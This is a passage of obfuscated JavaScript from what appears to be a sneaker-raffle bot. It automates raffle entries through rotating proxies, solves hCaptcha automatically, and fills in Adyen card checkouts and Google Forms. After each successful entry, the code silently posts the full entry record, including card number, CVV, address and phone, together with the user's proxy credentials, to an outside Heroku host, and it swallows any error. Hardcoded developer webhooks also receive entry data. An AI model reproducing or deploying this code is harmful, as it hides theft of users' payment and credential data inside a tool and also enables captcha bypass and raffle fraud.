                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xe7d9c3[0x0] + ':' + _0xe7d9c3[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x29f4b0 = await _0x40dba9['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0xe7d9c3[0x0] + ':' + _0xe7d9c3[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x4dc7a6 = await _0x29f4b0['newPage']();
                        await _0x4dc7a6['authenticate']({
                            'username': '' + _0xe7d9c3[0x2],
                            'password': '' + _0xe7d9c3[0x3]
                        }), console['log'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4dc7a6['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4dc7a6['setRequestInterception'](!![]), _0x4dc7a6['on']('request', _0x358d74 => {
                            _0x358d74['resourceType']() === 'image' || _0x358d74['resourceType']() === 'font' || _0x358d74['resourceType']() === 'media' ? _0x358d74['abort']() : _0x358d74['continue']();
                        });
                        try {
                            await _0x4dc7a6['goto'](_0x225237), await _0x558aee(0xbb8), await _0x4dc7a6['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x4dc7a6['click']('.control__JhutY'), await _0x558aee(0x1f4);
                        if (_0x31d86c[_0x3a4185]['Size'] != 'RANDOM')
                            try {
                                const _0x256cda = await _0x4dc7a6['$x']('//div[contains(text(),\x20\x27' + _0x31d86c[_0x3a4185]['Size'] + '\x27)]');
                                await _0x256cda[0x0]['click']();
                            } catch {
                                console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                                continue;
                            }
                        else {
                            const _0x1220b2 = await _0x4dc7a6['$$']('.options__3UQpT\x20>\x20div.row');
                            var _0x3b8c02 = Math['round'](Math['random']() * (_0x1220b2['length'] - 0x1));
                            await _0x1220b2[_0x3b8c02]['click']();
                        }
                        await _0x558aee(0x4b0);
                        const _0x3b7af1 = await _0x4dc7a6['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
                        await _0x3b7af1[0x0]['click'](), await _0x4dc7a6['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x4dc7a6['type']('input[name=\x22email\x22]', '' + _0x31d86c[_0x3a4185]['Email']), await _0x558aee(0x640), await _0x4dc7a6['type']('input[name=\x22phone\x22]', '' + _0x31d86c[_0x3a4185]['Phone']), await _0x558aee(0x4b0), await _0x4dc7a6['click']('button.btn.continue-button__1RtsS'), await _0x558aee(0x4b0);
                        try {
                            await _0x4dc7a6['type']('input[name=\x22firstName\x22]', '' + _0x31d86c[_0x3a4185]['FirstName']), await _0x558aee(0x258);
                        } catch {
                            const _0x3c235a = await _0x4dc7a6['$$eval']('.invalid-feedback\x20>\x20div', _0x47a374 => {
                                return _0x47a374['map'](_0x22c5b0 => _0x22c5b0['innerText']);
                            });
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20' + _0x3c235a));
                            continue;
                        }
                        await _0x4dc7a6['type']('input[name=\x22lastName\x22]', '' + _0x31d86c[_0x3a4185]['LastName']), await _0x558aee(0xc8), await _0x4dc7a6['type']('input[name=\x22instagramUsername\x22]', '' + _0x31d86c[_0x3a4185]['Follower']), await _0x558aee(0x4b0), await _0x4dc7a6['click']('button.btn.continue-button__1RtsS'), await _0x558aee(0x3e8), console['log'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x4dc7a6['select']('select[name=\x22country\x22]', '' + _0x31d86c[_0x3a4185]['Country']), await _0x558aee(0x2bc), await _0x4dc7a6['type']('input[name=\x22streetName\x22]', '' + _0x31d86c[_0x3a4185]['Address1']), await _0x558aee(0x258), await _0x4dc7a6['type']('input[name=\x22houseNumber\x22]', _0x31d86c[_0x3a4185]['HouseNumber'] + '\x20' + _0x31d86c[_0x3a4185]['Address2']), await _0x558aee(0xc8), await _0x4dc7a6['type']('input[name=\x22postalCode\x22]', '' + _0x31d86c[_0x3a4185]['Zip']), await _0x558aee(0x1f4), await _0x4dc7a6['type']('input[name=\x22city\x22]', '' + _0x31d86c[_0x3a4185]['City']), await _0x558aee(0x4b0), await _0x4dc7a6['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x558aee(0x4b0), await _0x4dc7a6['click']('button.btn.continue-button__1RtsS'), await _0x558aee(0x4b0), console['log'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x4dc7a6['solveRecaptchas'](), console['log'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x558aee(0xbb8), await _0x4dc7a6['click']('button.btn.continue-button__1RtsS'), await _0x558aee(0x1388), console['log'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x4dc7a6['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4dc7a6['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x558aee(0x4b0), await _0x4dc7a6['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x31d86c[_0x3a4185]['CardNumber']), await _0x558aee(0x320), await _0x4dc7a6['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x4dc7a6['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x31d86c[_0x3a4185]['ExpiryDate']), await _0x558aee(0x4b0), await _0x4dc7a6['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x4dc7a6['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x31d86c[_0x3a4185]['CVV']), await _0x558aee(0x226), await _0x4dc7a6['type']('input[name=\x22holderName\x22]', '' + _0x31d86c[_0x3a4185]['NameOnCard']), await _0x558aee(0x226), await _0x4dc7a6['click']('button.adyen-checkout__button'), console['log'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x4dc7a6['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x558aee(0xbb8);
                        } catch (_0x3e0348) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x203DS\x20Failed')), _0x424ca0 = '3DS\x20Error\x20' + _0x3e0348;
                            var _0x1dc890 = await _0x459281(_0x31d86c[_0x3a4185], _0x5b1930, 'dev', !![], _0x424ca0);
                            _0x423ec1['errorDEV'] = { 'embeds': [_0x1dc890] };
                            _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x423ec1['errorDEV']);
                            await _0x5a13a5(_0x877ec9, _0x423ec1['errorDEV']);
                            continue;
                        }
                        _0x10fee2(_0x31d86c[_0x3a4185], _0x5b1930), console['log'](_0xe2a5bb['green'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        let _0x3ebdbd = _0x31d86c[_0x3a4185];
                        try {
                            prxdata = {
                                'username': _0x94d398['replace']('#', ''),
                                'module': _0x5b1930['name'],
                                'entrydata': JSON['stringify'](_0x3ebdbd),
                                'proxy': '' + _0x110d9d[_0x3a4185]
                            };
                            var _0x19dccf = JSON['stringify'](prxdata);
                            let _0x3c67d0 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x3e71cb['post']('https://jraffles.herokuapp.com/success', _0x19dccf, _0x3c67d0);
                        } catch (_0x145186) {
                        }
                        if (_0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '')
                            try {
                                await _0x5a13a5(_0x11db88['webhook'], _0x423ec1['succesDEVMSG']);
                            } catch {
                            }
                        await _0x558aee(0xc8), await _0x5a13a5(_0x19b823, _0x423ec1['succesDEVMSG']), await _0x558aee(0xc8);
                        try {
                            await _0x5a13a5(_0x122725, _0x423ec1['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x15607f) {
                        console['log'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20' + _0x15607f), _0x424ca0 = '' + _0x15607f;
                        var _0x1dc890 = await _0x459281(_0x31d86c[_0x3a4185], _0x5b1930, 'dev', !![], _0x424ca0);
                        _0x423ec1['errorDEV'] = { 'embeds': [_0x1dc890] }, _0x11db88['webhook'] != undefined && _0x11db88['webhook'] != '' && await _0x5a13a5(_0x11db88['webhook'], _0x423ec1['errorDEV']), await _0x5a13a5(_0x877ec9, _0x423ec1['errorDEV']), _0x7c6414 = 'yes';
                    } finally {
                        _0x29f4b0['close']();
                        if (_0x7c6414 == 'yes' && _0x33639f != 0x5) {
                            console['log'](_0xe2a5bb['red'](_0xb9a031() + '\x20[' + _0x5b1930['name'] + ']\x20Task\x20' + (_0x3a4185 + 0x1) + '\x20:\x20Retrying\x20(' + _0x33639f + '\x20/\x205)')), _0x3a4185 = _0x3a4185 - 0x1, _0x33639f = _0x33639f + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x11db88['delay'] + '\x20ms'), await _0x558aee(_0x11db88['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'Google\x20Forms',
        'modules': [{
            'name': 'SMART\x20ENTRIES',
            'store': 'Google\x20Forms',
            'logo': 'https://www.pngplay.com/wp-content/uploads/13/Google-Logo-PNG-HD-Quality.png',
            'function': async function (_0x498525, _0xe446ea, _0xdce0f5) {
                let _0x2d3560 = {
                    'FirstName': '',
                    'LastName': '',
                    'Email': '',
                    'Country': '',
                    'Address': '',
                    'City': '',
                    'Zip': '',
                    'Size': '',
                    'Phone': ''
                };
                var _0x2e801a = _0x3f4ea0['readFileSync']('forms/templates.json', 'utf-8');
                let _0x4b1b42 = JSON['parse'](_0x2e801a), _0x526638 = ![];
                if (_0x4b1b42['length'] != 0x0) {
                    let _0x5a86d3 = 0x0;
                    for (template of _0x4b1b42) {
                        if (template['Url'] == _0xe446ea[0x0]['Url']) {
                            _0x526638 = !![], console['log'](_0xe2a5bb['yellow']('Would\x20you\x20like\x20to\x20use\x20this\x20template?'));
                            for (key in template) {
                                key != 'Url' && !key['includes']('Select') && !key['includes']('custom') && template[key] != '' && console['log'](template[key] + ':\x20' + _0xe2a5bb['cyan'](key)), (key['includes']('Select') || key['includes']('custom')) && console['log'](template[key]['title'] + ':\x20' + _0xe2a5bb['cyan'](template[key]['answer']));
                            }
                            console['log']();
                            async function _0x20ddaa() {
                                let _0x1f3e89 = await _0x255b95['get']('answer');
                                if (_0x1f3e89['answer']['toLowerCase']() != 'y' && _0x1f3e89['answer']['toLowerCase']() != 'n')
                                    return console['log']('Invalid\x20Selection'), _0x20ddaa();
                                return _0x1f3e89['answer']['toLowerCase']();
                            }
                            if (await _0x20ddaa() == 'n') {
                                _0x4b1b42['splice'](_0x5a86d3, 0x1), console['clear']();
                                break;
                            }
                            _0x2d3560 = template, console['clear']();
                            break;
                        }
                        _0x5a86d3++;
                    }
                }
                let _0x1243ec = 0x0, _0x46bf57 = 0x0;
                function _0x2061f1(_0x4ba009) {
                    console['log'](_0xb9a031() + '\x20[' + _0x498525['name'] + ']\x20Task\x20' + (_0x26e10a + 0x1) + '\x20:\x20' + _0x4ba009);
                }
                var _0x67c1d8 = 0x0;
                for (key in _0x2d3560) {
                    if (key['includes']('custom'))
                        _0x1243ec++;
                    if (key['includes']('Select'))
                        _0x46bf57++;
                }
                for (var _0x26e10a = 0x0; _0x26e10a < _0xe446ea['length']; _0x26e10a++) {
                    _0x2d3560['Url'] = _0xe446ea[_0x26e10a]['Url'];
                    let _0x13e4db = ![];
                    if (_0x4b1b42['length'] != 0x0)
                        for (template of _0x4b1b42) {
                            if (template['Url'] == _0xe446ea[_0x26e10a]['Url']) {
                                _0x2d3560 = template, _0x13e4db = !![], _0x2061f1('Found\x20Template');
                                break;
                            }
                        }
                    var _0x4f2140;
                    if (_0x27475c != 'yes') {
                        if (!_0x27475c)
                            var _0x27475c = '';
                        else
                            _0x27475c = '';
                        _0x67c1d8 = 0x0;
                    }
                    try {
                        await _0x162b07(_0xe446ea, _0x26e10a);
                    } catch {
                        _0x27475c = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x11db88['useRandomProxy'] = ![])
                        var _0x271089 = _0xdce0f5[_0x26e10a]['split'](':');
                    else
                        var _0x290db9 = Math['round'](Math['random']() * (_0xdce0f5['length'] - 0x1)), _0x271089 = _0xdce0f5[_0x290db9]['split'](':');
                    var _0x55e179;
                    if (_0x271089['length'] == 0x1)
                        try {
                            _0x55e179 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x55e179 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    else
                        try {
                            _0x55e179 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x271089[0x0] + ':' + _0x271089[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x55e179 = await _0x40dba9['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x271089[0x0] + ':' + _0x271089[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ],
                                'env': { 'LANGUAGE': 'en-US' }
                            });
                        }
                    try {
                        let _0x45a113 = { 'first': ![] };
                        const _0x431b22 = await _0x55e179['newPage']();
                        if (_0x271089['length'] != 0x0)
                            await _0x431b22['authenticate']({
                                'username': '' + _0x271089[0x2],
                                'password': '' + _0x271089[0x3]
                            });
                        _0x2061f1('Getting\x20Session');
                        let _0xc401e1 = ![];
                        try {
                            await _0x431b22['goto'](_0xe446ea[_0x26e10a]['Url'], {
                                'waitUntil': 'load',
                                'timeout': 0x0
                            }), await _0x558aee(0xbb8);
                        } catch (_0x5289c2) {
                            throw new Error(_0x5289c2);
                        }
                        const _0x222239 = await _0x431b22['$']('body\x20>\x20div.llhEMd.iWO5td\x20>\x20div\x20>\x20div.g3VIld.Up8vH.J9Nfi.iWO5td\x20>\x20div.XfpsVe.J9fJmf');
                        if (_0x222239) {
                            _0x2061f1('Login\x20Detected');
                            let _0x460e24 = await _0x222239['$']('div[data-id=\x22EBS5u\x22]');
                            await _0x460e24['click'](), _0xc401e1 = !![];
                        }
                        let _0x28f7b2 = await _0x431b22['$']('#identifierId');
                        _0x28f7b2 && (_0xc401e1 = !![]);
                        await _0x431b22['waitForSelector']('.teQAzf');
                        async function _0x48a915() {
                            let _0x37f452 = await _0x431b22['$$']('.o3Dpx\x20>\x20div[role=\x22listitem\x22]');
                            for (question of _0x37f452) {
                                let _0x528d53;
                                try {
                                    _0x528d53 = await question['$eval']('.M7eMe', _0x39fe70 => _0x39fe70['textContent']);
                                } catch {
                                    continue;
                                }
                                if (_0x1243ec != 0x0) {
                                    let _0x5702d2 = ![];
                                    for (let _0x506201 = 0x0; _0x506201 < _0x1243ec; _0x506201++) {
                                        if (_0x528d53 == _0x2d3560['custom' + _0x506201]['title']) {
                                            _0x2061f1('Custom\x20Selector\x20found;\x20' + _0x528d53);
                                            let _0x16ec56 = await question['$']('input[jsname=\x22YPqjbf\x22]'), _0x1beda1 = await question['$']('textarea[jsname=\x22YPqjbf\x22]');
                                            if (_0x16ec56)
                                                await _0x16ec56['type']('' + _0x2d3560['custom' + _0x506201]['answer']);
                                            else
                                                _0x1beda1 && await _0x1beda1['type']('' + _0x2d3560['custom' + _0x506201]['answer']);
                                            _0x5702d2 = !![];
                                            break;
                                        }
                                    }
                                    if (_0x5702d2) {
                                        await _0x558aee(0x15e);
                                        continue;
                                    }
                                }
                                if (_0x46bf57 != 0x0) {
                                    let _0x3b78cf = ![];
                                    for (let _0x1dca89 = 0x0; _0x1dca89 < _0x46bf57; _0x1dca89++) {
                                        if (_0x528d53 == _0x2d3560[_0x1dca89 + 'Select']['title']) {
                                            _0x2061f1('Custom\x20Selector\x20found;\x20' + _0x528d53);
                                            let _0x1e80f8 = await question['$$']('.ulDsOb');
                                            for (opt of _0x2d3560[_0x1dca89 + 'Select']['answer']) {
                                                let _0x4d6770 = await _0x1e80f8[opt]['$']('span');
                                                await _0x4d6770['click']();
                                            }
                                            _0x3b78cf = !![];
                                            break;
                                        }
                                    }
                                    if (_0x3b78cf) {
                                        await _0x558aee(0x15e);
                                        continue;
                                    }
                                }
                                try {
                                    if (_0x528d53 == _0x2d3560['0Select']['title']) {
                                        _0x2061f1('Custom\x20Selector\x20found;\x20' + _0x2d3560['0Select']['title']);
                                        let _0xa602ba = await question['$$']('.ulDsOb'), _0x1d5b2a = await _0xa602ba[_0x2d3560['0Select']['answer']];
                                        await _0x1d5b2a['click']();
                                        continue;
                                    }
                                    if (_0x528d53 == _0x2d3560['1Select']['title']) {
                                        _0x2061f1('Custom\x20Selector\x20found;\x20' + _0x2d3560['1Select']['title']);
                                        let _0x3109fc = await question['$$']('.ulDsOb'), _0x5410aa = await _0x3109fc[_0x2d3560['1Select']['answer']];
                                        await _0x5410aa['click']();
                                        continue;
                                    }
                                    if (_0x528d53 == _0x2d3560['2Select']['title']) {
                                        _0x2061f1('Custom\x20Selector\x20found;\x20' + _0x2d3560['2Select']['title']);
                                        let _0x17756e = await question['$$']('.ulDsOb'), _0x43c1d4 = await _0x17756e[_0x2d3560['2Select']['answer']];
                                        await _0x43c1d4['click']();
                                        continue;
                                    }
                                } catch (_0x1e2074) {
                                }
                                if (_0x528d53['toLowerCase']()['includes']('mail') && !_0x528d53['toLowerCase']()['includes']('agree') || _0x528d53 == _0x2d3560['Email']) {
                                    _0x2061f1('Mail\x20Selector\x20found;\x20' + _0x528d53);
                                    let _0x536957 = await question['$']('input');
                                    !_0x536957 && (_0x536957 = await question['$']('textarea[jsname=\x22YPqjbf\x22]'));
                                    await _0x536957['type'](_0xe446ea[_0x26e10a]['Email']), await _0x558aee(0x258);
                                    continue;
                                }
                                if (_0x528d53['toLowerCase']()['includes']('first') || _0x528d53['toLowerCase']() == 'name' || _0x528d53['toLowerCase']() == 'name\x20' || _0x528d53 == _0x2d3560['FirstName']) {
                                    _0x2061f1('FirstName\x20Selector\x20found;\x20' + _0x528d53);
                                    let _0x1dac63 = await question['$']('input');
                                    !_0x1dac63 && (_0x1dac63 = await question['$']('textarea'));
                                    await _0x1dac63['type'](_0xe446ea[_0x26e10a]['FirstName'] + '\x20'), await _0x558aee(0x258);
                                    if (_0x528d53 == _0x2d3560['FirstName'])
                                        continue;
                                }
                                if (_0x528d53['toLowerCase']()['includes']('last') || _0x528d53['toLowerCase']()['includes']('surname') || _0x528d53 == _0x2d3560['LastName']) {
                                    _0x2061f1('LastName\x20Selector\x20found;\x20' + _0x528d53);
                                    let _0x4b9c50 = await question['$']('input');
                                    !_0x4b9c50 && (_0x4b9c50 = await question['$']('textarea'));
                                    await _0x4b9c50['type'](_0xe446ea[_0x26e10a]['LastName'] + '\x20'), await _0x558aee(0x258);
                                    continue;
                                }
                                if (_0x528d53['toLowerCase']()['includes']('address') && !_0x528d53['toLowerCase']()['includes']('agree') || _0x528d53 == _0x2d3560['Address']) {
                                    _0x2061f1('Address\x20Selector\x20found;\x20' + _0x528d53);
                                    let _0x3161a0 = await question['$']('input');
                                    !_0x3161a0 && (_0x3161a0 = await question['$']('textarea'));
                                    await _0x3161a0['type'](_0xe446ea[_0x26e10a]['Address1'] + '\x20' + _0xe446ea[_0x26e10a]['HouseNumber'] + '\x20' + _0xe446ea[_0x26e10a]['Address2']), await _0x558aee(0x258);
                                    continue;
                                }
                                if (_0x528d53['toLowerCase']()['includes']('phone') || _0x528d53['toLowerCase']()['includes']('mobile') || _0x528d53 == _0x2d3560['Phone']) {
                                    _0x2061f1('Phone\x20Selector\x20found;\x20' + _0x528d53);
                                    let _0x1a4ee7 = await question['$']('input');
                                    !_0x1a4ee7 && (_0x1a4ee7 = await question['$']('textarea'));
                                    await _0x1a4ee7['type']('' + _0xe446ea[_0x26e10a]['Phone']), await _0x558aee(0x258);
                                    continue;
                                }
                                if (_0x528d53['toLowerCase']()['includes']('country') || _0x528d53 == _0x2d3560['Country']) {
                                    let _0x19cc59 = await question['$']('div[jsname=\x22wCJL8\x22]');
                                    if (_0x19cc59) {
                                        let _0x55f351 = ![], _0x535027 = await _0x19cc59['$$']('.ulDsOb');
                                        for (option of _0x535027) {
                                            let _0x149f61 = await option['$']('span'), _0x4eb0bd = await option['$eval']('span', _0x3ea3f8 => _0x3ea3f8['textContent']);
                                            if (_0x4eb0bd['toLowerCase']() == _0xe446ea[_0x26e10a]['Country']['toLowerCase']()) {
                                                await _0x149f61['click'](), _0x55f351 = !![];
                                                break;
                                            }
                                        }
                                        if (!_0x55f351) {
                                            const _0x3cd84b = await question['$']('.Hvn9fb.zHQkBf');
                                            await _0x3cd84b['click'](), await _0x3cd84b['type'](_0xe446ea[_0x26e10a]['Country']);
                                        }
                                        continue;
                                    }
                                    _0x2061f1('Country\x20Selector\x20found;\x20' + _0x528d53);
                                    let _0x409747 = await question['$']('input');
                                    !_0x409747 && (_0x409747 = await question['$']('textarea'));
                                    await _0x409747['type']('' + _0xe446ea[_0x26e10a]['Country']), await _0x558aee(0x258);
                                    continue;
                                }
                                if (_0x528d53['toLowerCase']()['includes']('city') || _0x528d53 == _0x2d3560['City']) {
                                    _0x2061f1('City\x20Selector\x20found;\x20' + _0x528d53);
                                    let _0x48a8a8 = await question['$']('input');
                                    !_0x48a8a8 && (_0x48a8a8 = await question['$']('textarea'));
                                    await _0x48a8a8['type']('' + _0xe446ea[_0x26e10a]['City']), await _0x558aee(0x258);
                                    continue;
                                }
                                if (_0x528d53['toLowerCase']()['includes']('zip') || _0x528d53 == _0x2d3560['Zip']) {
                                    _0x2061f1('Zip\x20Selector\x20found;\x20' + _0x528d53);
                                    let _0xecd53b = await question['$']('input');
                                    !_0xecd53b && (_0xecd53b = await question['$']('textarea'));
                                    await _0xecd53b['type']('' + _0xe446ea[_0x26e10a]['Zip']), await _0x558aee(0x258);
                                    continue;
                                }
                                if (_0x528d53['toLowerCase']()['includes']('insta') || _0x528d53 == _0x2d3560['Follower']) {
                                    _0x2061f1('Follower\x20Selector\x20found;\x20' + _0x528d53);
                                    let _0x4e1da7 = await question['$']('input');
                                    !_0x4e1da7 && (_0x4e1da7 = await question['$']('textarea'));
                                    await _0x4e1da7['type']('' + _0xe446ea[_0x26e10a]['Follower']), await _0x558aee(0x258);
                                    continue;
                                }
                                if (_0x528d53['toLowerCase']()['includes']('size') || _0x528d53 == _0x2d3560['Size']) {
                                    _0x2061f1('Size\x20Selector\x20found;\x20' + _0x528d53);
                                    let _0x28109a = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x28109a) {
                                        let _0x3f935d = await _0x28109a['$$']('.ulDsOb');
                                        if (_0xe446ea[_0x26e10a]['Size']['toLowerCase']() == 'random') {
                                            var _0x45450d = Math['round'](Math['random']() * (_0x3f935d['length'] - 0x1));
                                            await _0x3f935d[_0x45450d]['click']();
                                        } else
                                            for (size of _0x3f935d) {
                                                let _0x3f2639 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x308a83 => _0x308a83['textContent']);
                                                if (_0x3f2639['toLowerCase']()['includes'](_0xe446ea[_0x26e10a]['Size'])) {
                                                    await size['click']();
                                                    break;
                                                }
                                            }
                                    }
                                    let _0x49968e = await question['$']('.ry3kXd');
                                    if (_0x49968e) {
                                        await _0x49968e['click'](), await _0x558aee(0x9c4);
                                        let _0x184fa4 = await _0x431b22['$']('div[jsname=\x22V68bde\x22]'), _0x49ecea = await _0x184fa4['$$']('div[jsname=\x22wQNmvb\x22]');
                                        for (size of _0x49ecea) {
                                            let _0x20e846 = await size['$eval']('.vRMGwf.oJeWuf', _0x1f0503 => _0x1f0503['textContent']), _0x470461 = await size['$']('.vRMGwf.oJeWuf');
                                            if (_0x20e846['toLowerCase']()['includes'](_0xe446ea[_0x26e10a]['Size'])) {
                                                await _0x558aee(0x190), await _0x470461['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x558aee(0x258);
                                    continue;
                                }
                                if (_0x528d53['toLowerCase']()['includes']('receive') || _0x528d53['toLowerCase']()['includes']('method')) {
                                    _0x2061f1('Method\x20Selector\x20found;\x20' + _0x528d53);
                                    let _0xb42ce3 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0xb42ce3) {
                                        const _0x55337d = await _0xb42ce3['$$']('.ulDsOb');
                                        for (size of _0x55337d) {
                                            let _0x59aa62 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x2c47db => _0x2c47db['textContent']);
                                            if (_0x59aa62['toLowerCase']()['includes']('shipping')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x558aee(0x258);
                                    continue;
                                }
                                if (_0x528d53['toLowerCase']()['includes']('offers') || _0x528d53['toLowerCase']()['includes']('agree')) {
                                    _0x2061f1('Authorization\x20Selector\x20found;\x20' + _0x528d53);
                                    const _0x52c6c8 = await question['$']('div[jscontroller=\x22sW52Ae\x22]');
                                    if (_0x52c6c8) {
                                        const _0x503521 = await _0x52c6c8['$$']('.ulDsOb');
                                        for (size of _0x503521) {
                                            let _0x5cb113 = await size['$eval']('.aDTYNe.snByac.n5vBHf.OIC90c', _0x1f1193 => _0x1f1193['textContent']);
                                            if (_0x5cb113['toLowerCase']()['includes']('authorize') || _0x5cb113['toLowerCase']()['includes']('yes')) {
                                                await size['click']();
                                                break;
                                            }
                                        }
                                    }
                                    await _0x558aee(0x258);
                                    continue;
                                }
                                async function _0x1a85a5() {
                                    let _0x59a813 = await question['$']('.oyXaNc');
                                    if (_0x59a813) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0xe2a5bb['cyan'](_0x528d53) + '\x0a');
                                        let _0xa9deaf = await question['$$']('.ulDsOb');
                                        for (let _0x44fe2f = 0x0; _0x44fe2f < _0xa9deaf['length']; _0x44fe2f++) {
                                            let _0x2523e3 = await _0xa9deaf[_0x44fe2f]['$eval']('span', _0xe23600 => _0xe23600['textContent']);
                                            console['log']('\x20(' + _0x44fe2f + ')\x20' + _0x2523e3);
                                        }
                                        console['log']();
                                        let _0x6a133d = await _0x255b95['get']('option'), _0x1ec4a7 = await _0xa9deaf[_0x6a133d['option']]['$eval']('span', _0xf27838 => _0xf27838['textContent']);
                                        _0x2d3560[_0x46bf57 + 'Select'] = {
                                            'title': _0x528d53,
                                            'answer': _0x6a133d['option']['split'](',')
                                        };
                                        let _0x234876 = await _0xa9deaf[_0x6a133d['option']]['$']('span');
                                        await _0x234876['click'](), _0x46bf57++;
                                        return;
                                    }
                                    let _0x3a71b9 = await question['$']('.Y6Myld');
                                    if (_0x3a71b9) {
                                        console['log']('Choose\x20an\x20input\x20for\x20selector:\x20' + _0xe2a5bb['cyan'](_0x528d53) + '\x0a');
                                        let _0x233299 = await question['$$']('.ulDsOb');
                                        for (let _0x1d479c = 0x0; _0x1d479c < _0x233299['length']; _0x1d479c++) {
                                            let _0x4798d8 = await _0x233299[_0x1d479c]['$eval']('span', _0x1f3309 => _0x1f3309['textContent']);
                                            console['log']('\x20(' + _0x1d479c + ')\x20' + _0x4798d8);
                                        }
                                        console['log']();
                                        let _0x569a11 = await _0x255b95['get']('option');
                                        _0x2d3560[_0x46bf57 + 'Select'] = {
                                            'title': _0x528d53,
                                            'answer': _0x569a11['option']['split'](',')
                                        };
                                        for (opt of _0x2d3560[_0x46bf57 + 'Select']['answer']) {
                                            let _0x4af611 = await _0x233299[opt]['$']('span');
                                            await _0x4af611['click']();
                                        }
                                        _0x46bf57++;
                                        return;
                                    }
                                    var _0x22025e = 0x0;
                                    let _0xc97493 = Object['keys'](_0x2d3560);
